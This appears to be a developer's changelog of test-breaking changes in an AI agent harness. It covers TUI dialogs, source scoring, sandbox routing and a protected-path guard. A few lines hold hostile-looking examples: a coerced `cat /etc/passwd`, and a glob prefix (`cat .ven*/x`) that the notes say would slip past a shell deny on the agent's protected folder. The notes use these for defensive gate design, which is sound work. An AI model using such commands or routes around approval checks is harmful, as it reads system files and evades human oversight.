| `core/session.py` has no `WINDOW`, `set_window` or `window_for` | Anything reaching for the session window override — `tui/app.py` and ten tests in `test_session_overrides.py` | `AttributeError`. It moved to `core/model_windows.py` and is PERSISTED (WS6): keyed on every `(provider, model)`, surviving `/model` and a restart, and outranking both the provider query and `MODEL_CONTEXT_WINDOWS`. `session.clear()` now returns `["trigger"]` at most. If a test wants a window, call `model_windows.remember_window(provider, model, n)` |
| `compaction.thresholds()` no longer returns `config.COMPACTION_TRIGGER_TOKENS` | Any test asserting the default trigger against that constant | It is `compaction.derived_trigger(model, provider)` = `COMPACTION_TRIGGER_FRACTION × context_limit()`. Assert the RATIO, not a literal, or the test restates one model's arithmetic instead of the rule. `COMPACTION_TRIGGER_TOKENS` still exists and still answers for `pin_measurements`, which has no model in scope — so #89's cap is unchanged and a test about the pin cap needs no edit |
| A wrong `MODEL_CONTEXT_WINDOWS` entry now mistimes CHAT compaction, not just a research backstop | Nothing mechanical — it is the cost WS5 accepts | Under M1 the working-set trigger never consulted the table. It does now. This is why `core/model_windows.py` exists at the user tier and why the fallback still WARNS. If you add a model, add its window |
| `storage.MessageLog` has a `thinking` column; `save_message()` takes `thinking=` | `tests/conftest.py`'s `FakeStorage`, which must mirror `_to_neutral` exactly | The suite does not error, it goes QUIET: the fake reconstructs without the key and every test about replayed reasoning passes against a fake that never had any. Mirror both halves — `save_message` stores it, `_reconstruct` adds the key only when the row carried reasoning. `test_fake_storage_mirror.py` is the pin, and the real round trip belongs in `test_storage_e2e.py` because the claim is about a COLUMN |
| The neutral assistant shape can carry a `thinking` key | Anything asserting the whole dict — `test_storage_e2e.py` had one | Present ONLY when the row carried reasoning, so a pre-§44 message is byte-identical and the assertion still holds for it. If you need a turn with none, do not pass `thinking`; `ModelResponse.thinking` defaults to `None` |
| `_messages_for_provider` takes `model` and `echo_reasoning` | Positional callers passing two arguments — none outside `core/client.py` | Both DEFAULT to the pre-§44 behaviour (no model means no echo; the v1 side is opt-in), so an unchanged call produces an unchanged translation. **A test that drives this function directly cannot see whether `call_model_stream` passes them** — batch 42's lesson, and the reason `test_client_streaming.py` asserts on the recorded REQUEST |
| `_FakeAnthropicClient` records its stream kwargs in `.sent` | Nothing — it is what makes the above assertable | It used to swallow them in a lambda. A double that hides the arguments lets the wiring break with every translation test still green |
| `core/client.py` calls `b.model_dump()` on thinking blocks | A test double whose content blocks are bare `SimpleNamespace` | `AttributeError`, and only on a double that sets `type="thinking"` — every existing one is unaffected because the filter never matches. Give the double a `model_dump`; do NOT soften the call to a `getattr`, because #35's whole lesson is that a `getattr` returning `None` makes an SDK change look like a stream that carried nothing |
| `_thinking_for_provider("ANTHROPIC", …)` returns `{"type": "adaptive", "display": "summarized"}` | A test asserting that dict exactly | Intended, and it is a bug fix rather than a preference: the default is `"omitted"` on every current Anthropic model, which streams thinking blocks with EMPTY text — so §38 rendered nothing at all there for its whole life, silently |
| `main()`'s project path follows `AGENT_WORKSPACE` when it is set | Any test that sets that variable and expects cwd — none did | Intended (WS7). Patch `config.WORKSPACE_DIR` **and** `config.WORKSPACE_DIR_EXPLICIT` together; patching the first alone changes nothing, because the rule is the PRESENCE of the variable and not its value |
| `config.OUTPUT_DIR`'s default is `<AGENT_WORKSPACE>/output` | Anything asserting `./output` with the variable set | Unset, it is still `./output` — the default is one expression with no branch, `os.path.join(os.environ.get("AGENT_WORKSPACE", "."), "output")` |
| `.venastine/CONTEXT.md` is gone; the hub is the project's root `AGENTS.md` | Every test that writes or reads the old path — 20-odd across four files | `FileNotFoundError`, or an assertion that a file was not written. `project_docs.CONTEXT_FILENAME` is `HUB_FILENAME`, and the name itself lives in `core/workspace_trust.PROJECT_CONTEXT_FILENAME` because the load-bearing fact about it is that a grant covers it. `doc_path()` no longer branches. Index links are siblings, not `../` |
| `workspace_trust.content_files()` returns PROJECT-relative paths | Anything comparing against `.venastine/`-relative ones, and `_catalog_entries` | The entries are `AGENTS.md` and `.venastine/agents/x.md` now. `_catalog_entries` strips the prefix before matching — miss that and the trust prompt still renders, still lists the files, and simply stops saying what any of them would tell the model, which is the half #131 added |
| Every existing workspace-trust grant re-prompts once | Users, not tests | Intended. The digest covers a different set of files, because the set being consented to genuinely changed |
| `_content_hash()` iterates `content_files()` instead of walking | A test that patched `os.walk` to observe the hash | Patch it around `content_files` instead — there is one traversal now, which is the point: a file the listing omits cannot enter the hash. If you re-split them, expect #18 to happen again |
| `is_trusted()` returns True for an empty `.venastine/` | A test arranging an empty directory and expecting a prompt | Nothing loads from an empty directory, so there was never a question to ask. The shortcut asks the LISTING now, which is also what makes a root `AGENTS.md` with no `.venastine/` prompt |

## Batch 43 — who is speaking, and what the session remembers (2026-08-30)

| Change | What breaks | Symptom / fix |
|---|---|---|
| `preferences.load()` / `preferences.remember()` are now `load_theme()` / `remember_theme()` | Anything calling the old names — `tui/app.py` and two tests in `test_tui.py` | `AttributeError: module 'tui.preferences' has no attribute 'load'`. Renamed because the store holds two records now (RM4); `load_model` / `remember_model` are the siblings. **A test patching `tui.app.preferences.remember` goes vacuous rather than failing** — `mocker.patch` on a module attribute that no longer exists raises, but one patched on the wrong name in a NEW test would simply never intercept, which is the shape §22's twelve doubles had |
| Both writers read-modify-write the store | A "simplify: just write the fields we were given" edit to `_remember` | `test_the_two_records_share_a_file_without_clobbering_each_other` goes red, and so does the sibling that loads a pre-batch store. The theme and the model are written at different moments by different commands, so a writer that serialises only its own fields drops the other's — and each half looks correct in its own test, which is why both directions are pinned |
| `VenastineApp.__init__` and `tui.app.run()` take a trailing `cli_pinned` | Positional callers passing five arguments to either | Both default to `False`, so existing calls are unchanged and a test-built app behaves as if no launch flag were given. If a test needs the flag semantics, pass `cli_pinned=True` — do NOT simulate it by comparing the pair against settings, which is the inference RM5 rejects |
| `VenastineApp.__init__` READS the preference store | Any TUI test that cares which model it mounted on | `tests/conftest.py`'s autouse `isolate_ui_preferences` already covers it — the same fixture, for the same reason batch 36 added it: the mount path reads the store, so without it a test passes or fails depending on whether the person running the suite had ever typed `/model`. A test that writes the store must do so BEFORE constructing the app |
| The mount banner can carry `(remembered)` | A test asserting the banner string exactly | It appears only when the pair came from the store, so a test that does not arrange one is unaffected. Assert on the whole line rather than on the model name alone: the `/model` confirmation contains the name too, which made the first version of `test_the_redrawn_banner_reports_the_switched_model` pass against the reverted fix |
| `/model` writes to disk and prints "Remembered for the next launch." only on a write that landed | A test asserting `/model`'s trailing line is the old "This session only…" text | The old line is gone: the fact it stated is no longer true. A failed write WARNS inside `remember_model` and reaches the transcript through `TranscriptLogHandler`, so the command claims nothing it did not do — `test_a_failed_save_still_switches_the_model_and_claims_nothing` is the pin, and it is `/theme`'s rule applied to the second preference |
| `Transcript` draws one `venastine ›` per TURN, retired by the next `user` entry | Any test counting label rows, or asserting a label immediately precedes an answer | Intended (RM1). The label now opens the turn's first model output, reasoning included. Placement is derived from the role sequence in `_entries`, so if you add a role that should break a turn, teach `_render_entry` to clear `_label_in_force` — and check `rerender()` still agrees, because a replay that moves a label is the same defect as one that reflows a paragraph |
| `_cmd_new` clears the transcript and five per-thread fields | A test that arranges state, calls `/new`, and then reads that state back | Intended (RM2), and it is `switch_to_thread`'s list: `_last_run`, `_live_claims`, `_last_response`, `_tool_names`, `_file_calls`. The `_busy` refusal still runs first, so `test_new_thread_is_refused_mid_turn` is unaffected — a refused `/new` clears nothing |
| `on_mount`'s banner line moved into `_write_session_banner()` | A test patching or asserting the banner write at mount | Same text, one producer, now called by `/new` as well. Two copies of a status line are two copies that can disagree |


## Batch 51 — the catalog that was empty (2026-09-02)

| Change | What breaks | Symptom / fix |
|---|---|---|
| `agent_catalog_text()` is no longer `""` on the default install | Any test asserting it is empty, or that `## Available agents` is absent from an attended prompt | `test_spawnable.py::test_none_of_the_four_shipped_agents_is_spawnable` was exactly that test and is now `test_exactly_two_shipped_agents_are_spawnable`. A headless prompt is unchanged — `spawn_subagent` is unreachable there (R16) |
| Seven agents ship, not four | A test counting `config_loader.get_agents()` against the real harness tier | Use the roster, not the number. `real_harness_tier` is the fixture that reaches the real files |
| Fourteen skills ship, not four, and `software/` is a new category folder | A test asserting the skill catalog's length, or the set of categories | The catalog grew 610 → 2093 characters and it rides every research pass, so a byte-identical pass-prompt assertion must be regenerated |
| `explore` and `review` are SPAWNABLE | A test asserting that no shipped agent is | That was the assertion §32 wrote to fail on this day; see the first row |
| A new shipped agent must declare `spawnable` | Adding `agents/builtin/x.md` without it | `assert_spawnable_declared` raises at discovery naming every offender. This has always been true; the roster is the first time it applies to more than four files |
| Every tool a shipped agent or skill names must be REGISTERED | A typo in `allowed_tools` / `additional_tools` | `test_shipped_roster.py` fails naming the file and the token. Before this, a whitelist typo silently removed the tool the author meant to include |
| `plan`'s whitelist must remain a superset of every spawnable agent's | Adding a tool to `explore` or `review` without adding it to `plan` | `test_a_spawn_under_plan_loses_nothing` fails. C6 intersects, so the child would silently lose it (A13) |
| `explore`/`review` declare `read` and `shell`, which global config DENIES | A test assuming a spawned explore can read a file | On a stock install it cannot: `config.ToolPermissions` ships `read`/`write`/`edit`/`shell` as False and D14's global check is unconditional. `STOCK_TOOLS` in `test_shipped_roster.py` is what a default install can actually call |
| Asserting read-only through `is_tool_allowed` for `write`/`edit` is VACUOUS | A "stricter" test that adds them back to the policy-layer check | It answers False whatever the whitelist says. Assert those against the declaration; the policy layer for `write_project_doc`, `remember`, `spawn_subagent` |
| All three new agents set `use_project_context: true` | Setting one back to the default `false` | `test_each_one_receives_the_projects_own_agents_md` fails naming the agent. It was a mutation SURVIVOR before that test existed: the agent goes on answering, without the project's conventions, and nothing reports it |
| `AGENTS.md`'s TUI material moved out of the Skills section | A tool or script keyed on those heading offsets | Nothing in the repo is; the headings are `### The TUI (tui/, §16)`, `### Agents (agents/, §18/§32)`, `### Skills (skills/, §19)` |
| The decision-family map now claims `E1–E14` and `A1–A15` | Nothing — both were already in the record | `test_every_decision_id_the_map_claims_is_in_the_record` pins the claim; note it does NOT pin that a range covers its family, which is how `E13`/`E14` sat outside their own index |

Count 3462 -> 3483.

## Batch 50 — a template for the file that cannot explain itself (2026-09-02)

| Change | What breaks | Symptom / fix |
|---|---|---|
| `generator.generate()` takes `scaffold_docs=True` and `scaffold_config=False` | A caller passing positional arguments past `provider_name` — none does, they are keyword-only | `--config` alone is `(False, True)`: no kind question, no initializer, no spend. Two flags rather than a second entry point, because a config-only path beside `generate()` would be a second answer to "is an existing file overwritten" and a second place to forget the trust settle |
| `/init`'s TUI parser is a token LOOP, and stricter | A test passing `/init software` or `/init ---software` | Both were accepted by the old single `.lstrip("-")` and are now the error. `_split_init_flags(args) -> (kind, scaffold_config, problem)` is the seam to assert against; the flags compose in either written order, following `_split_research_flags` |
| The CLI init fixture builds `args` from `main.build_parser()` | A test constructing a `SimpleNamespace` for `run_init_command` | It went stale the moment `--project-config` was added, failing four tests with an `AttributeError` about the flag rather than anything they were testing. Pass `argv=[...]` to `_run` instead |
| `--project-config` without `--init` EXITS 1 | Nothing today | Deliberately unlike `--software-project` / `--research-project`, which are silently ignored. Those two keep their silence because changing them is a behaviour change with users; this flag has none yet |
| `.venastine/settings.json` and `mcp.json` are written DIRECTLY, not through `write_project_doc` | Any assumption that every `/init` write goes through the tool layer (§24 AC3) | That tool denies `.venastine/` by path segment and names these two files as the reason. **Do not widen its allowlist to "fix" this**: it is advertised to every run and all ten research passes, and `mcp.json` names a local command to execute. The single consent is what replaces the gate |
| The settings template is EVERY key the loader knows, minus `config_files.OMITTED` | Adding a settings key without adding a line to the template | `test_the_template_names_every_setting_the_loader_knows` fails and names the missing key. That is the trade `_KNOWN_TUI`'s comment already takes ("adding a preference is a schema change, on purpose"), moved one file along — the alternative is a schema that has quietly fallen behind, where an omission reads as "this one is not settable" |
| Six keys are omitted because writing their own default is NOT restating it | Any change that adds a presence-sensitive read of a scaffolded key | `test_the_scaffolded_settings_file_changes_nothing` fails, naming the key and both values. Put it in `OMITTED` with the reason — do not adjust the expected value. The six are `default_provider`, `default_model`, `effort`, `compaction.trigger_tokens`, `ensemble_mode` and `research.subagent_review`; `_trigger_is_configured()` is the model of the class, since it asks `"trigger_tokens" in ...` |
| "Inert" includes the LOG | A template key whose value survives the merge but warns on the way | Same test, which compares warnings between a project with the file and one without. `grounding_weights` carries a `None` key, JSON has no null key, and it round-trips as `"null"` — rejected against `GROUNDING_STATUSES` and logged every launch, with every merged number identical |
| `json_store.write_json_atomic` takes `trailing_newline: bool = False` | Nothing — every existing store writes the same bytes | On for the two scaffolded files only: they are the first written through it that a human is meant to edit and commit, and a committed file with no final newline carries git's marker in every diff of it |
| An existing `.venastine/settings.json` or `mcp.json` is never overwritten, per file | Nothing | I12 applied to the file it was written for. A project with a settings.json and no mcp.json still gets the mcp.json, and the run reports what it left alone |

Count 3426 -> 3462.

## Batch 49 — the decision is the part that falls off (2026-09-02)

| Change | What breaks | Symptom / fix |
|---|---|---|
| Every bounded `ScrollBox` is `height: auto; max-height: N`, never `height: N` | Nothing — it is the fix | A definite height bounds what the box DRAWS and not what its parent RESERVES, so the grid row or vertical stack kept growing with the content and the dialog's last children — its buttons — were clipped off the bottom. **Do not "restore" a definite height**: `test_a_bounded_box_reserves_its_bound_not_its_content` fails on both boxes, and it is parametrised because a definite height on the *command* box survived the first mutation pass (it wastes rows without pushing anything out, which is the invisible half) |
| §46 EP3's "a scrollable container asked for `height: auto` resolves to zero" is WRONG | Any reasoning that starts from it | Measured false. The zero was EP1's `1fr` ROW and the box had been measured inside one. With the row `auto`: `height: auto` draws the content, `height: N` draws N and reports the content height upward anyway, `height: auto; max-height: N` draws N and reports N. EP3's `Static` half is unchanged and still true |
| `#permission-dialog` is a `Vertical`, not a `Grid` | A test constructing or querying a `Grid`, or asserting `grid-size`/`grid-rows`/`column-span` | Every child carried `column-span: 2`, so the second column held nothing but the Deny button. `PermissionScreen`, `ConfirmScreen`, `ProjectKindScreen` and `SubagentSignoffScreen`'s empty branch all compose it |
| The `with-headline` class is GONE | `dialog.has_class("with-headline")` — one test asserted it | It existed only to carry a ROW COUNT to the stylesheet, because a Grid's `grid-size` is static and the screen composes three children or four. A Vertical does not care. What that class was FOR is now asserted directly: a tool declaring no headline is not charged the rows one costs |
| Buttons live in `Horizontal` bars: `#permission-buttons`, `#grant-buttons`, `#review-buttons`, `#question-buttons` | A test asserting a Button is a direct child of the dialog | The bar is one child, so the dialog's arithmetic stops depending on how many answers there are. Centred, not stretched — `test_the_decision_bar_is_centred_in_its_dialog` pins the gaps either side rather than the CSS |
| `ReviewScreen`'s four buttons are one ROW, not a stack | A test asserting their vertical order | Stacked they cost 12 of the 18 rows a dialog has at 80×24, so three of the four decisions were off the bottom — every answer except Accept |
| `#claims-body`, `#review-body` and `#question-body` are Statics inside `-box` ScrollBoxes | A test querying those ids for sizing | Same split §46 made for `#permission-params`: the id stays on the Static so `.visual._renderable.plain` still answers what was drawn; sizing assertions go to the `-box` |
| `#grant-list` and `#signoff-list` cap at 8 rows, not 14 | Nothing | #112 bounded the list and nothing bounded the SUM, so the confirm button was still off the bottom with twenty tools offered |
| `#permission-params-box` caps at 7 rows (was a definite 9, or 5 with a headline) | Nothing | One template now serves both shapes, so the taller one sets the budget. Everything past row 7 scrolls, and on the shell modal every line of it also appears above |
| Consent screens open focused on the DECLINING button | A test pressing Enter on a freshly-opened modal and expecting approval | `ConfirmScreen` opened focused on its affirmative button, so Enter said yes. `PermissionScreen`/`ConfirmScreen` → `#deny`, `SubagentSignoffScreen` → `#signoff-refuse`, `ReviewScreen` → `#review-reject`. `GrantPickerScreen` and `ProjectKindScreen` have no declining button and are asserted only not to open on an answer |
| `Button:focus` no longer resolves to `reverse` | A test asserting the focus text-style | `reverse` inverts the LABEL alone, so a focused green Allow drew its word green-on-white. Bold plus `background-tint: $foreground 25%` tints the whole button. Asserted on the RESOLVED style, because the rule has to win against a DEFAULT_CSS nested `&:focus` |
| `QuestionScreen` handles `Input.Submitted` | Nothing | Enter in "…or write your own answer" did nothing at all. It routes through `_answer`, the same helper `on_button_pressed` uses, so there is one answer shape |
| `ask_user` refuses an option over `MAX_OPTION_CHARS` (100) | A test passing a long option | An error, never a trim — M15, the same rule as the count cap beside it. 100 is measured: at 58 columns prose, twenty-character words and an unbroken run all wrap to two lines, and 105 makes two of the three wrap to three |
| `#question-options Button` is `width: 100%` | A test measuring an option button's width | At `width: auto` an option wider than the dialog was CUT at its edge — two options differing only past the cut rendered identically. The fixture must use options of DIFFERENT lengths or the assertion cannot fail: equal-length labels give equal auto widths |

Count 3349 -> 3426.

## Batch 48 — /copy: the last response that was never the last (2026-09-02)

| Change | What breaks | Symptom / fix |
|---|---|---|
| `VenastineApp._last_response` is GONE | Any test or caller reading or arranging it — five in `test_research_legibility.py`, `test_tui.py` and `test_thread_legibility.py` did | `AttributeError`. Read `app._transcript.last_answer()`, and ARRANGE it by writing to the transcript (`write_answer`) rather than by setting a field. That is the whole point: every `/copy last` test set the field by hand, which is why nobody noticed the field was never being set by the app |
| `core.replay.last_assistant_text` is GONE | An import of it — only the TUI and one test had one | `ImportError`. It existed for §27 AC4's state reset, which is now carried by `Transcript.reset()` dropping the entry log. `replay_entries` is untouched |
| `on_turn_finished` no longer captures `flush_stream()`'s return | Nothing — it never worked | It still flushes, because the span still has to be committed. The capture was dead: `on_loop_event_message` flushes at the terminal `final_response` event, so this one always saw a closed span and got `""`. If you find yourself re-adding it, the answer you want is `Transcript.last_answer()` |
| `Transcript.as_text()` takes an optional `roles` | Nothing — it defaults to `None`, which is every entry | `as_text(CONVERSATION_ROLES)` is `/copy conversation`; bare `as_text()` is still `/copy all`'s transcript half, harness lines included (#140) |
| `_COPY_TARGETS` has five entries | A test asserting `/help`'s `/copy` line, or the usage string | Both derive from the tuple. `conversation` sits before `all`, narrow to broad |
| A new transcript role must clear FOUR checks, not three | Adding a role to `MESSAGE_ROLES` in `tests/test_themes.py` | Batch 41's three (pairwise-distinct strings, ≥ 120 redmean separation, no `dim` outside `system`) plus this batch's: it must be in `CONVERSATION_ROLES` or `META_ROLES` in `tui/widgets.py`, and not in both. An unclassified role is silently absent from `/copy conversation` — safe, but nobody decided it |
| A failed tool with no known call id writes role `tool_error`, not `error` | A test asserting that line is bold red, or asserting on the `error` role | Intended. `error` is the harness's own voice and one role cannot mean both; §41 X2's weight rule already said a failed tool is plain rather than bold. The named branch one line above was already `tool_error` |
| `_cmd_new` clears the transcript and FOUR per-thread fields | The batch 43 row above, which says five | `_last_response` left the list. `/copy last` is still cleared by `/new` — through `_transcript.reset()`, which drops the entry log it now reads |

Count 3343 -> 3349.

## Batch 47 — §46, where a command runs and whether anyone can see it (2026-09-02)

| Change | What breaks | Symptom / fix |
|---|---|---|
| `#permission-dialog`'s middle grid row is `auto`, not `1fr` | Nothing — it is the fix | A `1fr` row inside a `height: auto` container resolves to **zero**, so `#permission-params` had `region.height == 0` and `virtual_size.height == 0` on all four screens sharing this dialog: every tool approval, `SubagentSignoffScreen`'s empty branch, `ConfirmScreen` and `ProjectKindScreen`. If you reintroduce a fractional row here, `test_every_modal_actually_draws_its_body` fails naming the widget. **Do not "restore" `1fr` to make the dialog fill space** |
| `#permission-params` and `#permission-command` are `Static`s inside `ScrollBox` containers (`#…-box`) that carry the sizing | A test querying `#permission-params` and expecting the sizing, or querying the box and expecting `.visual` | The ids deliberately stayed on the **Statics** so every existing `query_one("#permission-params").visual._renderable.plain` still answers what was DRAWN. Sizing assertions go to `#permission-params-box`. `ConfirmScreen`/`ProjectKindScreen` still use a bare `Static` with that id, so both shapes are styled |
| A `ScrollBox` needs a DEFINITE height, and a bounded `Static` does not scroll | Any attempt to write `height: auto; max-height: N` on either | Two adjacent traps, both silent: a scrollable container asked for `height: auto` renders at zero rows; a `Static` with `max-height` reports `virtual_size` equal to its clamped box, so `max_scroll_y` is 0 and the hidden rows are gone rather than below the fold. Measured at nine lines in a seven-row block with `End` doing nothing. `test_what_does_not_fit_the_payload_block_can_be_scrolled_to` asserts `visible + reachable == content` |
| `ToolSpec` gains `headline_param`; `registry` gains `headline_param()` / `headline_for()` | Nothing — it defaults to `None` and only `shell` declares one | A tool that declares one gets a pinned block above the notice on its approval modal and a `$` line on the CLI prompt. `headline_for` returns `None` for a non-string rather than coercing: the model's input reaches the gate unvalidated, and a coerced `['cat', '/etc/passwd']` would put a fabricated command in the one place on the screen that must be verbatim |
| The `permission_request` LoopEvent and the APPROVAL `Request` payload carry a `headline` key | Any test asserting the whole dict — `test_streaming_loop.py` has one, again | `assert perm[0] == {...}` fails with an extra key. Batch 42 added `rationale` the same way and the same test caught it; that is the test working. Add `"headline": None` rather than loosening it to a subset check |
| `PermissionScreen.__init__` and `ask_permission_blocking` take a trailing `headline` | Positional callers passing five arguments | Both default to `None`, so existing four-argument calls are unchanged and draw no pinned block |
| `containment_for(INERT, docker_available=True)` now returns `CONTAINED` | Any test asserting INERT is UNCONTAINED — `test_inert_and_host_read_are_both_uncontained` was one | Split into two tests, because the two tiers stopped having one answer. HOST_READ is UNCONTAINED however healthy Docker is, and that is permanent: its defining property is an argument the container cannot see. The APPROVAL answer is unchanged, and `test_moving_inert_into_the_container_did_not_move_the_gate` asserts the two containments agree rather than asserting today's value |
| `run_sandboxed` routes INERT to `_run_docker` when Docker is up | Any test patching `_run_inert` and expecting an inert command to reach it | Pass `docker_available=False` for the light-path case, or patch `_run_docker` and `security.sandbox._log_image_identity`. The container call passes `argv=True`, which runs the command as a pre-split vector instead of through `bash -c` — asserted, because `bash` would be a third tokeniser between the classifier and the executor and the gap between two of them is where #157 arrived twice |
| Every `run_sandboxed` return carries `ran_on` and `tier` | Any test asserting the result dict exactly | Add the keys. `shell.run()`'s `{"error": ...}` paths are deliberately NOT annotated — they never executed anything. `test_every_backend_annotates` walks all six (command, docker) routes, so a route added later that forgets is caught by that rather than by the three spelled-out cases |
| `_run_docker` passes `--label venastine.sandbox=1` | A test asserting the exact argv length or index positions | Assert by `args.index("--label")`, as the existing `--network` tests do |
| `_log_image_identity()` runs at `run_sandboxed`'s docker branch, not inside `_run_docker` | A test that patches `subprocess.Popen` to inspect `_run_docker`'s argv | It was inside `_run_docker` first and broke exactly those tests: `subprocess.run` is implemented via `Popen`, so the image probe was captured by their mock and raised `ValueError: not enough values to unpack`. Keep `_run_docker` a function that builds an argv and opens one process. Patch `security.sandbox._log_image_identity` when driving `run_sandboxed` |

Count 3313 -> 3343.

## Batch 46 — §45, what a source is worth and how close it actually is (2026-09-02)

| Change | What breaks | Symptom / fix |
|---|---|---|
| `score_claim` scales the grounding component by source quality when `sources_scored=True` | Any pipeline test whose Pass 3a payload asserts a `grounded` claim with `"sources": []`, or with a source on a generic host | The claim tiers MEDIUM or LOW where the test expects HIGH. **This is the feature, not a regression**: a claim asserted as grounded while citing nothing now scores at `SOURCE_QUALITY_FLOOR`, and an ordinary `.com` is not a strong source. Fix the FIXTURE — `tests/test_orchestrator._source()` and its twin in `test_critic_routing` build a well-formed entry with an authoritative default URL. Do NOT pass `sources_scored=False` to make a test green; that flag means "no scoring stage ran", and lying about it is how a claim nothing measured gets re-tiered |
| `score_claim(claim)` with no `weights` still scores exactly what it always did | A "tidy-up" that makes `weights` non-optional, or binds `default_weights()` at import | Every byte-for-byte regression in `test_confidence_scoring.py` goes red at once. The default is the whole compatibility property, and the function form exists so a monkeypatched constant is still seen |
| `AUTHORITY_FULL_CREDIT` normalises authority before the product | Retuning it, or removing it as "redundant" | `test_the_tier_still_discriminates_across_the_domain_table` goes red. Without it the formula multiplies two RANK scales and everything from Nature to a Pinterest pin lands MEDIUM — a tier that no longer discriminates. The sweep is the guard; it fails loudly rather than shipping a collapsed table |
| `SOURCE_QUALITY_FLOOR` is 0.25, not 0.4 | Rounding it "back" to a neater number | `test_the_worst_possible_grounding_is_flagged` goes red at exactly 0.4, because `0.5*0.4 + 0.35 == 0.55` IS the MEDIUM threshold — the floor would then guarantee MEDIUM for every grounded claim however bad its sources. Check the arithmetic against `TIER_THRESHOLDS` before moving either |
| Pass 3a and Pass 6b prompts changed shape: `quote`, `authority_adjustment`, `authority_reason`; no `authority_score` | `tests/test_untrusted_content.py`'s pinned digests | `assert actual == digest` fails naming the pass. The digest is what updates, with a comment saying why — the guard's own docstring says so, and the Pass 3b entry is the precedent. **If you did not mean to change a prompt, this is the test telling you that you did** |
| `_translate` takes a `corpus=` sink and `_run_pass*` forward it | A test double replacing `_translate` with a two-argument function | `TypeError: _translate() got an unexpected keyword argument 'corpus'`. It defaults to `None` and collects nothing, so only a double that redefines the signature is affected |
| `run.source_documents` is written only by `_ground_and_score` | Adding a second writer "to keep it fresh" | Nothing fails immediately, which is the danger. It is refreshed at the one seam both grounding sites cross, which is late enough to be complete and early enough that a run dying later still carries its evidence. A second writer is two writers of related data — the shape §22 warns about by name |
| `confidence` and `source_scoring` are TOP-LEVEL settings sections | Moving them under `research` for tidiness | `_NESTED_SETTINGS` supports exactly ONE level, and both the validator and the cross-tier merge iterate it. `research.confidence` silently fails to merge across tiers — the defect review finding F2 already records. Deepening the merge is a separate change with its own tests |
| An out-of-range knob WARNS and falls back; an unknown key still RAISES | A "consistency" edit making `effective_confidence` raise like `effective_compaction` | `test_an_out_of_range_weight_falls_back_and_warns` goes red. The asymmetry is argued in §45: a bad compaction trigger burns model calls on every turn, a bad scoring weight costs one number in one report, and refusing to start a ten-pass run over a typo is the worse failure |
| `core.reasoning.scholar` holds a module-level response cache | Any test injecting a failing `fetch` after another test cached a success | **The suite does not error, it goes QUIET**: the failing fake is never called and the test asserts happily against the cached payload. `tests/conftest.py`'s autouse `clear_scholar_cache` covers it — the same reason `_net_common.TTLCache.clear` exists at all |
| `pipeline_models.resolve("critic")` outranks `config.CRITIC_MODEL` | A test setting `config.CRITIC_MODEL` while a store entry exists | The store wins, by design (SQ7). `isolate_pipeline_models` gives every test an empty one, so `mocker.patch.dict(config.__dict__, ...)` behaves as it always did unless the test itself writes the store |
| `/embedder` remembers only what its probe accepted | A test patching `core.client.embed_texts` on the wrong path | The probe worker imports it as `core.client.embed_texts`; patching a re-export would leave the real function running and the test would hang or reach a provider. Patch the source module, and use `settle` for the result — the probe is a worker, so `await pilot.pause()` alone races it |

### Standing: a fixture that drifts from a prompt makes a stage talk

Since §45 the scoring stage writes a trace line for every kind of malformed source it corrects, and
is SILENT on a clean payload. That silence is what `test_pipeline_trace_contains_expected_lines_in_order`
depends on. So a Pass 3a fixture missing `similarity_score`, or carrying `"sources": []` on a
`grounded` claim, does not merely test something slightly stale — it makes an unrelated test fail
with a message about trace ordering. When a payload fixture and a prompt disagree, fix the fixture.

Count 3271 -> 3313.

---

## Protected-segment guard (`.venastine/`) — `test_file_ops.py` / `test_shell.py`

`security/protected_paths.PROTECTED_SEGMENTS` is ONE list with three consumers: the file tools'
`refusal_check` and three handlers (hard deny), and `shell._shell_approval_check` (always ask).
`project_docs._DENIED_SEGMENTS` unions it rather than re-spelling the segment. The tests pin the
SPLIT as much as the guard, so each half has its own failure signature.

### What breaks it

| Change | Symptom | Fix |
|---|---|---|
| Dropping `refusal_check=file_ops._protected_refusal` from a ToolSpec | **Nothing red at first** — the handler backstop refuses anyway and `dispatch()` returns the same `{"error": ...}`, so `test_dispatch_refuses_without_asking_anyone` stays green. `test_the_registry_knows_the_refusal_pre_approval` is what goes red: it reads `registry.refusal_reason()` directly, because with the backstop in place the wiring half is invisible to a behavior test. The cost of dropping it: a human is prompted for a call the tool would refuse, and a headless denial loses the real reason | Restore the kwarg on the registration at `tools/registry.py` |
| Moving the protected-segment check in `_shell_approval_check` below the `auto_approve_fallback` branch | `test_the_fallback_opt_in_no_longer_covers_a_protected_write` goes red: `touch .venastine/notes.txt` with Docker down and both fallback flags set auto-approves again | The check must precede the fallback branch. The `UNAVAILABLE` short-circuit moved above it is a no-op (the two containment answers are disjoint) and is what lets the check sit before both |
| Making the shell side DENY instead of ask, or "fixing" the deny into `_file_approval_check` | `test_the_approval_layer_is_unchanged_the_deny_is_not_its_job` (file tools) and `test_the_routing_is_unchanged_it_still_classifies_inert` (shell) go red. An approval OR-gate has no answer that DENIES; and a shell deny is a lie a glob prefix (`cat .ven*/x`) walks past — on the INERT tier there is no shell to expand it, so the deny that misses reads as a pass | The file tools deny via `refusal_check` + handlers; the shell only ever ASKS, which is what leaves the full command text in front of a human |
| Teaching `_command_touches_protected` to split tokens on more than the first `=` | No test fails immediately — that is the point of G2. The generative totality corpus (`TestTheGateAnswersForEveryString`) is the nearest guard: `\;` and non-string commands go through the gate, and a helper that parses more syntax eventually raises inside it (Q3's original bug, one layer down) | Keep the check to raw tokens, the one `=` split, and the realpath — the same vocabulary `_escapes_workspace` permits itself |
| Monkeypatching one of `file_ops.WORKSPACE_ROOT` / `config.WORKSPACE_DIR` without the other in a new test | The `workspace` fixture sets BOTH (`WORKSPACE_ROOT` is captured at import and cannot follow a rebind — the reason sandbox's `_within` re-derives its own root); the shell tests set `config.WORKSPACE_DIR` because `classify_command` takes the directory as an argument. A half-patch makes the guard and the handler answer different workspaces | Use the fixtures; do not re-derive the pair |

Count 3483 -> 3510.

---

## The turn label opens above a tool call — `test_live_output.py` / `test_themes.py`

§43 RM1, amended: `_render_entry`'s `tool` branch now calls `_open_label()`, and the research
pipeline's tool lines carry their own role (`pipeline_tool`) so the amendment cannot reach
them. The opener set and the `/copy` classification are orthogonal concerns: `pipeline_tool`
is CONVERSATION (batch 48's copy shape is unchanged) and NOT an opener (the run's label
belongs to the report). `tool_error` and `diff` stay exempt — pinned, not forgotten.

### What breaks it

| Change | Symptom | Fix |
|---|---|---|
